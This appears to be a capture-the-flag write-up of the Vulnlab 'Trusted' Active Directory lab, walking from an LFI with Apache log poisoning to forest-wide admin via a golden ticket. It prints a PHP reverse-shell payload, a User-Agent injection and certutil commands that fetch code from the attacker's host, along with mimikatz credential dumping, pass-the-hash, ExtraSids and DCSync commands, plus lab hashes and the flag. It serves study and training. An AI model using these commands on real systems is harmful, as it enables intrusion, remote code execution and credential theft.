---
title: Vulnlab Trusted Machine
date: 2025-10-31 00:00:00 +0000
categories: [WRITUPS, ACTIVE DIRECTORY]
tags: [activedirectory]
---

# TRUSTED (Chains machines)

[https://api.vulnlab.com/api/v1/share?id=2be9c86c-25ca-4254-a014-541ca09ba7fb](https://api.vulnlab.com/api/v1/share?id=2be9c86c-25ca-4254-a014-541ca09ba7fb)

`10.10.175.133`
`10.10.175.134`

We start by scanning the two given IPs (a scan with nmap).

- `10.10.175.133`

```bash
â”€# nmap -sV -T4 -p- -sC -oN nmap-1.txt 10.10.175.133
Nmap scan report for 10.10.208.181
Host is up (0.16s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-10 17:03:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
..............................................
|_ssl-date: 2025-07-10T17:04:58+00:00; +2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: TRUSTED
|   NetBIOS_Domain_Name: TRUSTED
|   NetBIOS_Computer_Name: TRUSTEDDC
|   DNS_Domain_Name: trusted.vl
|   DNS_Computer_Name: trusteddc.trusted.vl
|   DNS_Tree_Name: trusted.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-07-10T17:04:48+00:00

```

- `10.10.175.134`

```bash
# nmap -sV -T4 -p- -sC -oN nmap-2.txt 10.10.175.134
Nmap scan report for 10.10.208.182
Host is up (0.18s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
| http-title: Welcome to XAMPP
|_Requested resource was http://10.10.208.182/dashboard/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-10 16:57:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
| tls-alpn: 
|_  http/1.1
| http-title: Welcome to XAMPP
|_Requested resource was https://10.10.208.182/dashboard/
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MariaDB 5.5.5-10.4.24
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
..............................................................
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LAB
|   NetBIOS_Domain_Name: LAB
|   NetBIOS_Computer_Name: LABDC
|   DNS_Domain_Name: lab.trusted.vl
|   DNS_Computer_Name: labdc.lab.trusted.vl
|   DNS_Tree_Name: trusted.vl
|   Product_Version: 10.0.20348

```

We can see from the two scans above that we are dealing with two parent and child domains, `lab.trusted.vl` and `trusted.vl`.

## Initial Acces

We note that on target 10.10.175.134, port 80 is open, providing web access, which could be a vector for attack.

![Desktop View](/assets/img/sample/image.png){: .normal }

We noticed a default welcome page. After several searches on the versions, source code, and everything else, I didn't find anything interesting. So I tried a brute force directory attack with Gobuster.

```bash
â”€# gobuster dir --url http://10.10.175.134 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -k 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.175.134
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 336] [--> http://10.10.175.134/img/]
/dev                  (Status: 301) [Size: 336] [--> http://10.10.175.134/dev/]

```

We note a dev directory, to which we have access.

![Desktop View](/assets/img/sample/image1.png){: .normal }

- I searched through the source code, but I didn't find anything.
- In the contact section, I tried cross-scripting, but that didn't work either.

But on this side, I notice an endpoint that could be interesting for LFI to exploit and get an RCE on the server. ***[http://10.10.175.134/dev/index.html?view=contact.html](http://10.10.175.134/dev/index.html?view=contact.html)***

So I used this position to try my hand at farming: 

[File Inclusion (LFI/RFI) | Exploit Notes](https://exploit-notes.hdks.org/exploit/web/security-risk/file-inclusion/#log-poisoning)

The idea here is to take advantage of an LFI flaw to exploit Log Poisoning and gain RCE on the server. 


>ðŸ’¡
>The **log poisoning** on an Apache server in a context of **LFI (Local File Inclusion)** is a very classic but powerful technique that can enable **remote code execution (RCE)**.
>We **inject malicious PHP code into Apache logs** (access.log, error.log, etc.) by manipulating the **User-Agent header**, then we force the vulnerable application to include this log file with the LFI flaw. When the file is included, **the server interprets the PHP code**, and we thus obtain code execution. 


1. There is a URL vulnerable to LFI:
    
    [http://10.10.175.134/dev/index.html?view=](http://10.10.175.134/dev/index.html?view=)..\..\..\..\xampp\apache\logs\access.log
    
    ![Desktop View](/assets/img/sample/Trusteds/image2.png){: .normal }
    
2. We are going to prepare our payload, so I found a PHP payload suitable for the Windows environment: 

[https://github.com/Dhayalanb/windows-php-reverse-shell](https://github.com/Dhayalanb/windows-php-reverse-shell)

```php
?php

header('Content-type: text/plain');
$ip   = "10.8.6.184"; //change this 
$port = "4444"; //change this
$payload = "7Vh5VFPntj9JDklIQgaZogY5aBSsiExVRNCEWQlCGQQVSQIJGMmAyQlDtRIaQGKMjXUoxZGWentbq1gpCChGgggVFWcoIFhpL7wwVb2ABT33oN6uDm+tt9b966233l7Z39779/32zvedZJ3z7RO1yQjgAAAAUUUQALgAvBEO8D+LBlWq>
$evalCode = gzinflate(base64_decode($payload));
$evalArguments = " ".$port." ".$ip;
$tmpdir ="C:\\windows\\temp";
chdir($tmpdir);
$res .= "Using dir : ".$tmpdir;
$filename = "D3fa1t_shell.exe";
$file = fopen($filename, 'wb');
fwrite($file, $evalCode);
fclose($file);
$path = $filename;
$cmd = $path.$evalArguments;
$res .= "\n\nExecuting : ".$cmd."\n";
echo $res;
$output = system($cmd);
                                    
?>
```

1. Open the web server on the local computer

```bash
â””â”€# python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:9001/) ...
```

1.  Inject a PHP payload into the user agent (with Burp Suite)

```bash
GET / HTTP/1.1
...
User-Agent: <?php file_put_contents('shell.php', file_get_contents('http://10.8.6.184/shell.php')); ?>

```

![Desktop View](/assets/img/sample/image3.png){: .normal }

Once injected, we can reload the page. We will see in the logs of our local web server that we downloaded earlier that the file was successfully downloaded.

```bash
â”€# python -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.175.134 - - [12/Jul/2025 18:00:03] "GET /shell1.php HTTP/1.1" 200 -
```

1. We can now execute the payload on the endpoint: [http://10.10.175.134/dev/shell.php](http://10.10.175.134/dev/shell.php)

With our listener in place, we obtain a shell.

```bash
â””â”€# rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.6.184] from (UNKNOWN) [10.10.175.134] 51737
b374k shell : connected

Microsoft Windows [Version 10.0.20348.887]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\Temp> whoami
 whoami
nt authority\system

C:\Windows\Temp>
```

## Domain enumeration

Remember that the goal is to have control over the parent domain trusted.lab.
Since SYSTEM is our machine that is in the domain, this allows us to list the domain as a user belonging to the domain. But before that, we already see two users who have had access to the machine.

```bash

 Directory of C:\Users

09/18/2022  09:07 PM    <DIR>          .
09/14/2022  03:20 PM    <DIR>          Administrator
09/19/2022  10:50 AM    <DIR>          cpowers
09/18/2022  09:07 PM    <DIR>          ewalters
09/15/2021  03:12 PM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  15,416,614,912 bytes free

C:\Users>
```

With our privilege, we can try to dump the LSA memory. With Mimikatz uploader from our machine, we can perform the dump. 

```bash
certutil -urlcache -f http://10.8.6.184:9001/mimikatz.exe mimikatz.exe

.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

![Desktop View](/assets/img/sample/image4.png){: .normal }

cpowers : 322db798a55f85f09b3d61b976a13c43

With the Powerview module, let's see if our user cpowers belongs to an interesting group.

```bash
PS C:\Users\Administrator> import-module .\PowerView.ps1
import-module .\PowerView.ps1
PS C:\Users\Administrator> Get-DomainGroup -UserName "cpowers"
```

```bash
PS C:\Users\Administrator> Get-DomainGroup -UserName "cpowers" | select name
Get-DomainGroup -UserName "cpowers" | select name

name                                  
----                                  
Denied RODC Password Replication Group
Domain Admins                         
Domain Users                          

```

The user cpowers is the domain administrator. We can use the credentials obtained above to log in with evil-winrm.

```bash
â””â”€# evil-winrm -i 10.10.175.134 -u 'cpowers'  -H 322db798a55f85f09b3d61b976a13c43                               
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\cpowers\Documents> whoami
lab\cpowers
*Evil-WinRM* PS C:\Users\cpowers\Documents> 
```

## ðŸŽ¯ **Escalation from child domain to Active Directory forest administrator**

### Get a list of all domain approvals for the current domain

```bash
*Evil-WinRM* PS C:\Users\cpowers\Documents> Get-DomainTrust

SourceName      : lab.trusted.vl
TargetName      : trusted.vl
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 9/14/2022 6:42:24 PM
WhenChanged     : 7/12/2025 8:25:40 PM
```

We note that the child domain lab.trusted.vl has a bidirectional relationship with the parent domain trusted.vl.
The goal is to be the admin domain on the parent domain trusted.vl, thereby gaining control over the entire forest.

### **ExtraSids Attack**


>ðŸ’¡
>The **SIDHistory** attack allows an attacker, after compromising a child domain in an Active Directory forest, to extend their privileges to the parent domain by exploiting the **SIDHistory** attribute. By injecting the **SID of the Enterprise Admins group** (from the parent domain) into the SIDHistory of a controlled account (real or fictitious) in the child domain, the attacker can generate a **Golden Ticket** with this SID added. When authenticating with this ticket, the parent domain controller recognizes the user as a member of Enterprise Admins (because SIDHistory is honored between domains in the same forest), which grants them administrative rights over the entire forest, without actually having been added to this group.

To execute this attack after compromising a child domain, the following elements must be gathered:

- the **KRBTGT hash** of the child domain,
- the **SID of the child domain**,
- a **target user name** in the child domain (which can be fictitious),
- the **FQDN** (fully qualified domain name) of the child domain,
- and the **SID of the Enterprise Admins group** in the parent (root) domain.
    
Once this information is obtained, the attack can be carried out using **Mimikatz** by generating a **Golden Ticket** containing the SIDHistory of the Enterprise Admins group.
    

1. the **KRBTGT hash** of the child domain

```bash
\SafetyKatz.exe '"lsadump::lsa /patch"' "exit"

```

![Desktop View](/assets/img/sample/image%205.png){: .normal }

krbtgt : `c7a03c565c68c6fac5f8913fab576ebd`

1. the **SID of the child domain**,

```bash
*Evil-WinRM* PS C:\Users\cpowers\Documents> Get-DomainSID
S-1-5-21-2241985869-2159962460-1278545866
*Evil-WinRM* PS C:\Users\cpowers\Documents> 
```

1. a **target username** in the child domain (which can be fictitious),

I choose Administrator

2. the **FQDN** (fully qualified domain name) of the child domain,

```bash
*Evil-WinRM* PS C:\Users\cpowers\Documents> Get-Domain | Select-Object Name

Name
----
lab.trusted.vl
```

3.  the **SID of the Enterprise Admins group** in the parent (root) domain.

```bash
.\mimikatz.exe "privilege::debug" "lsadump::trust /patch" "exit"
```

![Desktop View](/assets/img/sample/image%206.png){: .normal }

Trusted.vl SID : `S-1-5-21-3576695518-347000760-3731839591`

**Enterprise Admins group = Parent domain SID-519, so in our case, the Enterprise Admins group =** `S-1-5-21-3576695518-347000760-3731839591-519`

### Exploitation

```bash
SafetyKatz.exe "kerberos::golden /user:Administrator
/domain:lab.trusted.vl /sid:S-1-5-21-2241985869-2159962460-1278545866
 /sids:S-1-5-21-3576695518-347000760-3731839591-519
/krbtgt:c7a03c565c68c6fac5f8913fab576ebd /ptt" "exit"
```

```bash
mimikatz(commandline) # kerberos::golden /user:Administrator /domain:lab.trusted.vl /sid:S-1-5-21-2241985869-2159962460-1278545866 /sids:S-1-5-21-3576695518-347000760-3731839591-519 /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /ptt
User      : Administrator
Domain    : lab.trusted.vl (LAB)
SID       : S-1-5-21-2241985869-2159962460-1278545866
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3576695518-347000760-3731839591-519 ;
ServiceKey: c7a03c565c68c6fac5f8913fab576ebd - rc4_hmac_nt
Lifetime  : 7/14/2025 8:15:50 PM ; 7/12/2035 8:15:50 PM ; 7/12/2035 8:15:50 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ lab.trusted.vl' successfully submitted for current session
```

All that remains is to clear the ntds memory of the parent domain trusted.vl,

```bash
lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all
```

At this point, I encountered difficulties running it under evil-winrm. Something like this: 

```bash
mimikatz(commandline) # lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all
[DC] 'trusted.vl' will be the domain
[DC] 'trusteddc.trusted.vl' will be the DC server
[DC] Exporting domain 'trusted.vl'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
ERROR kull_m_rpc_drsr_getDCBind ; RPC Exception 0x00000005 (5
```

Now I tried to log in as user cpowers via RDP. If you look closely, you can see that there was an open RDP port.

```bash
xfreerdp /u:cpowers /d:lab.trusted.vl /pth:322db798a55f85f09b3d61b976a13c43 /v:10.10.239.230

```

Restricted administrator mode, which is disabled by default, must be enabled on the target host; otherwise, the following error will be displayed:

![Desktop View](/assets/img/sample/image%207.png){: .normal }

 This feature can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa with a value of 0. This can be done using the following command

```bash
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once reconnected in graphical mode, we try this command again in administrator mode. 

```bash
lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all
```

![Desktop View](/assets/img/sample/image%208.png){: .normal }

We have obtained the hash for the Administrator user of the parent domain. Now let's try to log in. 

- In PSRemote mode, I am limited, and I cannot read the flag.

```bash
evil-winrm -i 10.10.132.117 -u 'Administrator'  -H 15db914be1e6a896e7692f608a9d72ef
```

```bash
â””â”€# evil-winrm -i 10.10.132.117 -u 'Administrator'  -H 15db914be1e6a896e7692f608a9d72ef
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
The operation completed successfully.

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
*Evil-WinRM* PS C:\Users\Administrator\Desktop> more root.txt
VL{1ffd4561083a1bdbb4e15346ba7aaf31}
```

Note that if you are unable to read the flag due to a restriction, try connecting graphically with this command

```bash
â””â”€# xfreerdp /u:Administrator /pth:15db914be1e6a896e7692f608a9d72ef /v:10.10.132.117 /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect
```

Administrator : `15db914be1e6a896e7692f608a9d72ef`